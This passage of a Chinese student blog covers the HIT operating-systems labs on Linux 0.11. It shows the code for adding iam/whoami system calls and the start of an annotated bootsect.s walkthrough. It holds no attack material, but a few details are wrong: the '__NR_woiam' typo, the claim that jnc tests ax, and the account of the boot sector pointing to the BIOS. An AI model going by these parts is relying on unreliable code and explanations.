class="line"><span class="comment"> * [ nothing wrong here, Linus ]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_fs</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> _v;</span><br><span class="line">	__asm__(<span class="string">&quot;mov %%fs,%%ax&quot;</span>:<span class="string">&quot;=a&quot;</span> (_v):);</span><br><span class="line">	<span class="keyword">return</span> _v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_ds</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> _v;</span><br><span class="line">	__asm__(<span class="string">&quot;mov %%ds,%%ax&quot;</span>:<span class="string">&quot;=a&quot;</span> (_v):);</span><br><span class="line">	<span class="keyword">return</span> _v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set_fs</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov %0,%%fs&quot;</span>::<span class="string">&quot;a&quot;</span> ((<span class="keyword">unsigned</span> <span class="keyword">short</span>) val));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编写 sys_iam 和 sys_whoami 的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/segment.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> msg[<span class="number">24</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_iam</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">24</span>];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++)&#123;</span><br><span class="line">        tmp[i] = get_fs_byte(name+i);</span><br><span class="line">        <span class="keyword">if</span>(tmp[i] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i&gt;=<span class="number">23</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(msg,tmp);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_whoami</span><span class="params">(<span class="keyword">char</span> *name,<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    len = <span class="built_in">strlen</span>(msg);</span><br><span class="line">    <span class="keyword">if</span>(len &gt; size)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        put_fs_byte(msg[i],name+i);</span><br><span class="line">        <span class="keyword">if</span>(msg[i] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>系统调用号在 <code>linux-0.11/include/unistd.h</code> 文件中，我们可以在其末尾添加新的系统调用号：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_iam	72</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_woiam	73</span></span><br></pre></td></tr></table></figure>
<ul>
<li>需要注意的是：这里同时需要修改 <code>hdc-0.11.img</code> 中的 <code>hdc/usr/include/unistd.h</code> 文件，如果想在虚拟机中使用 gcc 编译的话，会导入虚拟机 <code>hdc/usr/include/</code> 中的文件为头文件</li>
</ul>
<p>系统调用总数量则记录在 <code>linux-0.11/kernel/system_call.s</code> 中，将其改为74：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nr_system_calls = <span class="number">74</span></span><br></pre></td></tr></table></figure>
<p>接下来需要在系统调用中添加我们实现的程序，为此我们需要先分析一下系统调用的代码</p>
<p>在 linux-0.11 中，<code>system_call.s</code> 文件为 Linux 内核中所有系统调用的实现提供了框架，主要包含以下内容：</p>
<ul>
<li>系统调用函数原型声明：定义了每个系统调用的函数原型，以便其他汇编文件可以方便地调用这些函数</li>
<li>系统调用处理函数：定义了实际处理每个系统调用的函数，这些函数由内核驱动，并通过中断处理机制执行</li>
<li>系统调用参数转换函数：在调用用户空间应用程序之前，系统调用参数需要进行转换，这些函数负责将内核提供的参数转换为应用程序需要的格式</li>
</ul>
<p>所有系统调用的入口如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">system_call:</span><br><span class="line">	cmpl $nr_system_calls-1,%eax	# 系统调用号不存在</span><br><span class="line">	ja bad_sys_call</span><br><span class="line">	push %ds					# 将段寄存器和目的寄存器压栈保存</span><br><span class="line">	push %es</span><br><span class="line">	push %fs</span><br><span class="line">	pushl %edx</span><br><span class="line">	pushl %ecx		# push %ebx,%ecx,%edx as parameters</span><br><span class="line">	pushl %ebx		# to the system call</span><br><span class="line">	movl $0x10,%edx		# set up ds,es to kernel space</span><br><span class="line">	mov %dx,%ds</span><br><span class="line">	mov %dx,%es</span><br><span class="line">	movl $0x17,%edx		# fs points to local data space</span><br><span class="line">	mov %dx,%fs</span><br><span class="line">	call sys_call_table(,%eax,4)	# 执行系统调用</span><br></pre></td></tr></table></figure>
<p>在 sys_call_table 中记录了所有的系统调用，其位置在 <code>linux-0.11/include/linux/sys.h</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">extern int sys_iam();</span><br><span class="line">extern int sys_whoami();</span><br><span class="line"></span><br><span class="line">fn_ptr sys_call_table[] = &#123; sys_setup, sys_exit, sys_fork, sys_read,</span><br><span class="line">sys_write, sys_open, sys_close, sys_waitpid, sys_creat, sys_link,</span><br><span class="line">sys_unlink, sys_execve, sys_chdir, sys_time, sys_mknod, sys_chmod,</span><br><span class="line">sys_chown, sys_break, sys_stat, sys_lseek, sys_getpid, sys_mount,</span><br><span class="line">sys_umount, sys_setuid, sys_getuid, sys_stime, sys_ptrace, sys_alarm,</span><br><span class="line">sys_fstat, sys_pause, sys_utime, sys_stty, sys_gtty, sys_access,</span><br><span class="line">sys_nice, sys_ftime, sys_sync, sys_kill, sys_rename, sys_mkdir,</span><br><span class="line">sys_rmdir, sys_dup, sys_pipe, sys_times, sys_prof, sys_brk, sys_setgid,</span><br><span class="line">sys_getgid, sys_signal, sys_geteuid, sys_getegid, sys_acct, sys_phys,</span><br><span class="line">sys_lock, sys_ioctl, sys_fcntl, sys_mpx, sys_setpgid, sys_ulimit,</span><br><span class="line">sys_uname, sys_umask, sys_chroot, sys_ustat, sys_dup2, sys_getppid,</span><br><span class="line">sys_getpgrp, sys_setsid, sys_sigaction, sys_sgetmask, sys_ssetmask,</span><br><span class="line">sys_setreuid,sys_setregid,sys_iam,sys_whoami &#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>在其中添加 sys_iam，sys_whoami 即可完成注册</li>
</ul>
<p>最后需要在 makefile 中添加 sys_iam，sys_whoami 的链接，不然就会引发如下报错：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ld: kernel/kernel.o:(.data+0x120): undefined reference to `sys_iam&#x27;</span><br><span class="line">ld: kernel/kernel.o:(.data+0x124): undefined reference to `sys_whoami&#x27;</span><br><span class="line">make: *** [Makefile:67：tools/system] 错误 1</span><br></pre></td></tr></table></figure>
<p>修改 makefile：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OBJS  = sched.o system_call.o traps.o asm.o fork.o \</span><br><span class="line">	panic.o printk.o vsprintf.o sys.o exit.o \</span><br><span class="line">	signal.o mktime.o whoami.o</span><br></pre></td></tr></table></figure>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### Dependencies:</span></span><br><span class="line">whoami.s whoami.o: whoami.c ../<span class="keyword">include</span>/linux/kernel.h ../<span class="keyword">include</span>/unistd.h</span><br></pre></td></tr></table></figure>
<p>为了测试系统调用，我们可以将 hdc-0.11.img 挂载（使用 mount-hdc 脚本），然后再往其中写入测试脚本的代码</p>
<p>不过在此之前我们需要先了解一下 _syscallN 宏：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _syscall0(type,name) \</span></span><br><span class="line"><span class="meta">type name(void) \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">long __res; \</span></span><br><span class="line"><span class="meta">__asm__ volatile (<span class="meta-string">&quot;int $0x80&quot;</span> \</span></span><br><span class="line"><span class="meta">	: <span class="meta-string">&quot;=a&quot;</span> (__res) \</span></span><br><span class="line"><span class="meta">	: <span class="meta-string">&quot;0&quot;</span> (__NR_##name)); \</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">if</span> (__res &gt;= 0) \</span></span><br><span class="line"><span class="meta">	return (type) __res; \</span></span><br><span class="line"><span class="meta">errno = -__res; \</span></span><br><span class="line"><span class="meta">return -1; \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _syscall3(type,name,atype,a,btype,b,ctype,c) \</span></span><br><span class="line"><span class="meta">type name(atype a,btype b,ctype c) \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">long __res; \</span></span><br><span class="line"><span class="meta">__asm__ volatile (<span class="meta-string">&quot;int $0x80&quot;</span> \</span></span><br><span class="line"><span class="meta">	: <span class="meta-string">&quot;=a&quot;</span> (__res) \</span></span><br><span class="line"><span class="meta">	: <span class="meta-string">&quot;0&quot;</span> (__NR_##name),<span class="meta-string">&quot;b&quot;</span> ((long)(a)),<span class="meta-string">&quot;c&quot;</span> ((long)(b)),<span class="meta-string">&quot;d&quot;</span> ((long)(c))); \</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">if</span> (__res&gt;=0) \</span></span><br><span class="line"><span class="meta">	return (type) __res; \</span></span><br><span class="line"><span class="meta">errno=-__res; \</span></span><br><span class="line"><span class="meta">return -1; \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __LIBRARY__ */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>N</code> 是一个整数（表示系统调用的编号），<code>...</code> 是一个可变参数列表（用于传递系统调用的参数），<code>##</code> 是一个 C 语言宏展开的符号（<code>##name</code> 将被替换 <code>name</code>）</li>
<li><code>&quot;=a&quot;</code> 用于指定返回寄存器 <code>__res</code> 的输出模式（返回寄存器 <code>__res</code> 用于存储系统调用的返回值），这段代码的作用是：在执行完汇编代码后应该将结果存储在 eax 寄存器中</li>
<li>将系统调用号 <code>__NR_##name</code> 和参数 <code>a b c</code> 压入栈中，最后执行 <code>int 0x80</code></li>
</ul>
<p>在 linux-0.11 上函数调用和系统调用的底层代码是不同的，_syscallN 宏的出现可以使我们以函数调用的方式去写系统调用的C代码</p>
<p>下面是利用 _syscallN 执行系统调用的测试脚本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LIBRARY__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">_syscall2(<span class="keyword">int</span>,whoami,<span class="keyword">char</span> *,name,<span class="keyword">unsigned</span> <span class="keyword">int</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">24</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> re = whoami(name,<span class="number">24</span>);</span><br><span class="line">    <span class="keyword">if</span>(re != <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;output successfully!\n&quot;</span>,name);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;my name is %s\n&quot;</span>,name);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LIBRARY__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">_syscall1(<span class="keyword">int</span>,iam,<span class="keyword">const</span> <span class="keyword">char</span> *,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">24</span>] = <span class="string">&quot;iam yhellow&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> re = iam(name);</span><br><span class="line">    <span class="keyword">if</span>(re != <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input successfully!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用如下命令进行编译：（最好在 linux-0.11 中进行编译）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o whoami whoami.c -Wall</span><br><span class="line">gcc -o iam iam.c -Wall</span><br></pre></td></tr></table></figure>
<p>最终效果如下：</p>
<img src="/2023/10/20/HIT-OSLab2/1697810935770.png" class width="1697810935770"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/20/HIT-OSLab1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/20/HIT-OSLab1/" class="post-title-link" itemprop="url">HIT-OSLab1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-20 00:41:59 / Modified: 00:42:46" itemprop="dateCreated datePublished" datetime="2023-10-20T00:41:59+08:00">2023-10-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>HIT-OSLab1</strong></p>
<p>实验目标：</p>
<ul>
<li>改写 bootsect.s 的代码，使得屏幕上可以输出 <code>YHellowOS is loading...</code></li>
<li>使 bootsect.s 能够完成 setup.s 的载入，并跳转到 setup.s 开始执行处，并输出 <code>Now we are in SETUP</code></li>
<li>将 setup.s 获取到的硬件参数输出到屏幕上</li>
<li>完成了输出硬件参数的步骤后，不再继续加载 linux 内核，保持上述信息</li>
</ul>
<p><strong>实验过程</strong></p>
<p>先简单解释分析一下 bootsect.s 的作用：</p>
<ul>
<li>bootsect.s 是一个汇编程序，是引导扇区的源代码（该扇区被称为引导扇区，是一个计算机启动时第一个读取的扇区，通常是硬盘或软盘的第一个扇区）</li>
<li>引导扇区通常包含一个引导扇区表（Boot Sector Table，BST），该表指向计算机的引导Loader（通常是BIOS）和操作系统 </li>
</ul>
<p>其核心代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SETUPLEN = 4				! nr of setup-sectors # setup程序代码占用扇区数</span><br><span class="line">BOOTSEG  = 0x07c0			! original address of boot-sector # bootsect起始地址</span><br><span class="line">INITSEG  = 0x9000			! we move boot here - out of the way </span><br><span class="line">SETUPSEG = 0x9020			! setup starts here # setup起始地址</span><br><span class="line">SYSSEG   = 0x1000			! system loaded at 0x10000 (65536). # system起始地址</span><br><span class="line">ENDSEG   = SYSSEG + SYSSIZE		! where to stop loading</span><br><span class="line"></span><br><span class="line">entry _start</span><br><span class="line">_start:</span><br><span class="line">	mov	ax,#BOOTSEG</span><br><span class="line">	mov	ds,ax			# ds:数据段基地址</span><br><span class="line">	mov	ax,#INITSEG</span><br><span class="line">	mov	es,ax			# es:附加段基地址</span><br><span class="line">	mov	cx,#256			# cx:计数器(用于指示rep循环的次数)</span><br><span class="line">	sub	si,si			# si:数据段偏移</span><br><span class="line">	sub	di,di			# di:附加段偏移</span><br><span class="line">	rep					# 用于重复执行一段汇编代码(默认计数器为cx)</span><br><span class="line">	movw				# movw默认的源寄存器是ds:si,目标寄存器是es:di</span><br><span class="line">	jmpi	go,INITSEG</span><br></pre></td></tr></table></figure>
<ul>
<li>这一段指令使位于 0x07c00 的 bootsect 代码，被全部拷贝到了 0x90000</li>
<li>最后跳转到 0x90000 从 go 标号处开始执行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">go:	mov	ax,cs			# cs:代码段基地址</span><br><span class="line">	mov	ds,ax</span><br><span class="line">	mov	es,ax</span><br><span class="line">! put stack at 0x9ff00.</span><br><span class="line">	mov	ss,ax			# ss:栈段基地址</span><br><span class="line">	mov	sp,#0xFF00		! arbitrary value &gt;&gt;512</span><br><span class="line"></span><br><span class="line">! load the setup-sectors directly after the bootblock.</span><br><span class="line">! Note that &#x27;es&#x27; is already set up.</span><br><span class="line"></span><br><span class="line">load_setup:</span><br><span class="line">	mov	dx,#0x0000		! drive 0, head 0 		# 驱动器编号&#x27;0&#x27;和磁头编号&#x27;0&#x27;</span><br><span class="line">	mov	cx,#0x0002		! sector 2, track 0		# 扇区号&#x27;2&#x27;和磁道号&#x27;0&#x27;</span><br><span class="line">	mov	bx,#0x0200		! address = 512, in INITSEG	   # 读取数据的起始地址为512</span><br><span class="line">	mov	ax,#0x0200+SETUPLEN	! service 2, nr of sectors	# 读取的数据长度为0x200+4</span><br><span class="line">	int	0x13			! read it</span><br><span class="line">	jnc	ok_load_setup		! ok - continue</span><br><span class="line">	mov	dx,#0x0000</span><br><span class="line">	mov	ax,#0x0000		! reset the diskette</span><br><span class="line">	int	0x13</span><br><span class="line">	j	load_setup</span><br></pre></td></tr></table></figure>
<ul>
<li>指令 <code>int 0x13</code> 的中断服务程序实质上就是磁盘服务程序，用于读取 setup 的代码并将其加载到程序的内存 0x90200 中 </li>
<li>如果 ax 寄存器的值大于0，则 jnc 会使程序跳转至 ok_load_setup，否则会尝试再次加载 setup</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">ok_load_setup:</span><br><span class="line"></span><br><span class="line">! Get disk drive parameters, specifically nr of sectors/track</span><br><span class="line"></span><br><span class="line">	mov	dl,#0x00</span><br><span class="line">	mov	ax,#0x0800		! AH=8 is get drive parameters</span><br><span class="line">	int	0x13</span><br><span class="line">	mov	ch,#0x00</span><br><span class="line">	seg cs				# 将cs的值加载到数据段(seg [ds:] address)</span><br><span class="line">	mov	sectors,cx</span><br><span class="line">	mov	ax,#INITSEG</span><br><span class="line">	mov	es,ax</span><br><span class="line"></span><br><span class="line">! Print some inane message</span><br><span class="line"></span><br><span class="line">	mov	ah,#0x03		! read cursor pos</span><br><span class="line">	xor	bh,bh</span><br><span class="line">	int	0x10</span><br><span class="line">	</span><br><span class="line">	mov	cx,#24</span><br><span class="line">	mov	bx,#0x0007		! page 0, attribute 7 (normal)</span><br><span class="line">	mov	bp,#msg1</span><br><span class="line">	mov	ax,#0x1301		! write string, move cursor</span><br><span class="line">	int	0x10</span><br><span class="line"></span><br><span class="line">! ok, we&#x27;ve written the message, now</span><br><span class="line">! we want to load the system (at 0x10000)</span><br><span class="line"></span><br><span class="line">	mov	ax,#SYSSEG</span><br><span class="line">	mov	es,ax		! segment of 0x010000</span><br><span class="line">	call	read_it				# 读取磁盘上的system</span><br><span class="line">	call	kill_motor			# 关闭驱动器马达,这样就可以知道驱动器的状态了</span><br><span class="line"></span><br><span class="line">! After that we check which root-device to use. If the device is</span><br><span class="line">! defined (!= 0), nothing is done and the given device is used.</span><br><span class="line">! Otherwise, either /dev/PS0 (2,28) or /dev/at0 (2,8), depending</span><br><span class="line">! on the number of sectors that the BIOS reports currently.</span><br><span class="line"># 检查要使用哪个根文件系统设备</span><br><span class="line"></span><br><span class="line">	seg cs				</span><br><span class="line">	mov	ax,root_dev</span><br><span class="line">	cmp	ax,#0</span><br><span class="line">	jne	root_defined</span><br><span class="line">	seg cs</span><br><span class="line">	mov	bx,sectors</span><br><span class="line">	mov	ax,#0x0208		! /dev/ps0 - 1.2Mb</span><br><span class="line">	cmp	bx,#15</span><br><span class="line">	je	root_defined</span><br><span class="line">	mov	ax,#0x021c		! /dev/PS0 - 1.44Mb</span><br><span class="line">	cmp	bx,#18</span><br><span class="line">	je	root_defined</span><br><span class="line">undef_root:</span><br><span class="line">	jmp undef_root</span><br><span class="line">root_defined:</span><br><span class="line">	seg cs</span><br><span class="line">	mov	root_dev,ax</span><br><span class="line"></span><br><span class="line">! after that (everyting loaded), we jump to</span><br><span class="line">! the setup-routine loaded directly 